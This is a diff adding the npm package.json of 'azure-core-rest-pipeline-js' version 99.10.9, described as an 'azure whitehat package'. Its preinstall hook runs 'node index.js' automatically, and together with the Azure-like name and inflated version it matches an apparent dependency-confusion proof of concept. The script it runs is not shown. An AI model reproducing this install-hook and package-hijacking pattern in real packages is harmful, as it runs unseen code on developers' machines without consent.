@@ -1,0 +1,39 @@
+{
+    "name": "azure-core-rest-pipeline-js",
+    "version": "99.10.9",
+    "description": "azure whitehat package",
+    "main": "index.js",
+    "scripts": {
+        "test": "echo \"error no test specified\" && exit 1",
+        "preinstall": "node index.js"
+    },
+    "author": "",
+    "License": "ISC",
+    "_id": "azure-core-rest-pipeline-js@99.10.9",
+    "_nodeVersion": "14.16.1",
+    "_npmVersion": "6.14.11",
+    "dist": {
+        "integrity": "sha512-hVyNo2onqT4ba9AWAL6zfAW7IA1fS7PnYKFAgbR6StbdEUHe5FT+f9nAApkXmCu2B86/l3rAuN/FrkEqMXFiHQ==",
+        "shasum": "a826236f2f8d0d5cc4194dc9d81675a4a4a5fd6d",
+        "tarball": "https://registry.npmjs.org/azure-core-rest-pipeline-js/-/azure-core-rest-pipeline-js-99.10.9.tgz",
+        "fileCount": 2,
+        "unpackedSize": 3591,
+        "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v3.0.13\r\nComment: https://openpgpjs.org\r\n\r\nwsFcBAEBCAAQBQJhoSesCRA9TVsSAnZWagAAvSMP/ilrkg6lOkoVSCwDfKAL\nIHz6vxJbrCVQHrUcDaMedkXY1zcrX0UYmC5hRMY7SOp9qFgfCsIP3kE6uzst\nUkM0qqf/a3xOKYEu0Hfp08x3Z4QH5Qb1yCt4vJS+oA2Uz6pX5Vri2WPsPEET\nd1LPugwOv5zYTfJW8zu0J5Gg/ImWzfg2XgSsshXpTeMNegTm811V1YbWAU/F\nKdqUqNuvU/Sz3ZuOARl01hG7d4Jn32pLXVDMMxfW5wmw291Mr/eF43DR/R4d\nBE40Fv3TImcVl/8tgwSf0kZXIgLDlJ3zhimtmL8dideiKnfHZyBf18pN8dgu\nsqU+RHR9znJlaDdiH6dDQ9omI4p7phnHxOc7wv2HLyRvcZAPw2Io3SaloQQL\ndlv06H/SQ8fwgay0iRvUo0zqGslpgp96cApRD3uFa99TKeHT/fxor3MaNLyZ\n/otHtdzlryGIrnJ9hBoqfzVs6gYAKYPOim5FT5H3fVUQa2OoiAIFvRunkzRv\n3Gg/GRwClFZ46BSgTGj8q6a7Utnfzl65Bh5VDs7tCcgVyzJVH/l4gyqEOBkB\nW9+Pi8tXWpxoygTTGphrwFrFGLftGwTTzBB6T46KFyI4AEH034CLLbVDBtc5\nt0U6snAq3pyFh4gbuT7FNQeAMOn3Wun4BP+QBdvxu3EFU7JHVoo7xWy8W4f2\nw42x\r\n=oS7H\r\n-----END PGP SIGNATURE-----\r\n"
+    },
+    "_npmUser": {
+        "name": "azure-tests",
+        "email": "hussam.tes08+3@gmail.com"
+    },
+    "directories": {},
+    "maintainers": [
+        {
+            "name": "azure-tests",
+            "email": "hussam.tes08+3@gmail.com"
+        }
+    ],
+    "_npmOperationalInternal": {
+        "host": "s3://npm-registry-packages",
+        "tmp": "tmp/azure-core-rest-pipeline-js_99.10.9_1637951404356_0.7839438000741865"
+    },
+    "_hasShrinkwrap": false
+}
